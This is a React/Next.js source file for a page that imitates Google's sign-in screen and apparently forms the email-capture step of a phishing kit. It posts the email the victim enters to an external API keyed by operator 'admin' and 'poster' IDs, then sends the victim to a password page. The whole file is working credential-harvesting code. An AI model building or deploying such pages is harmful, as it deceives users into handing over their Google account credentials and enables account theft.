"use client"
import React, { useState } from 'react'
import { Form, Formik,Field,ErrorMessage} from "formik";
import { useRouter } from "next/navigation";
import { API_URL, site } from '../config/index';
import Cookies from "js-cookie";
function page() {
  const adminId = Cookies.get("adminId");
  const posterId = Cookies.get("posterId");
  const router = useRouter();
  
  const initialvalues = {
    email: "",
  };
  const handleSubmit = async(values, formik) => {
    const { email } = values;
   const userData = {
    email,
    site: site
   }
   if(!email){
    return
   }
    const url = `${API_URL}/email/post/${adminId}/${posterId}`;

    const res = await fetch(url, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
      },
      body: JSON.stringify(userData),
    });
    const data = await res.json();
    console.log(data);

    if (res.ok) {
      console.log("success", data);
      Cookies.set("email", data?.info?.email);
      Cookies.set("id", data?.info?._id);
      router.push("/password")
    } else {
      console.log("error", data);
    }


   
  };

  return (
    <div className='flex flex-col justify-start items-center mt-[100px]'>
      <img src="/images/google.png"  width={95} height={35}/>
      <div className="">
      <div className="text-center">
  <p className='font-medium text-xl mt-5'>Sign in</p>
  <p className='text-sm mt-1'>Enter your Email</p>
  <p className='text-[#1a73e8] text-sm mt-1'>Learn more about using Guest mode</p>
  </div>
  <Formik  initialValues={initialvalues} onSubmit={handleSubmit}>
  {
    (formik) => (
      <Form >
        <Field
         
          className='w-[350px] px-3 py-3 border border-gray-300 outline-none rounded-md mt-5 placeholder:pl-5'
          type="email"
          name="email"
          id="email"
          placeholder="Enter your email address"
          required
        />
         <p className='text-[#1a73e8] text-sm mt-2'>Forgot email?</p>
  <div className="flex justify-between mt-3">
    <p className='text-[#1a73e8] text-sm mt-7 text-center'>Create account</p>
    <button type='submit' onClick={handleSubmit} className=' bg-[#1a73e8] text-white px-3 py-2 border border-gray-300 outline-none rounded-full mt-5'>Next</button>
  </div>
      </Form>
    )
  }
 </Formik>
      </div>
    </div>
  )
}

export default page


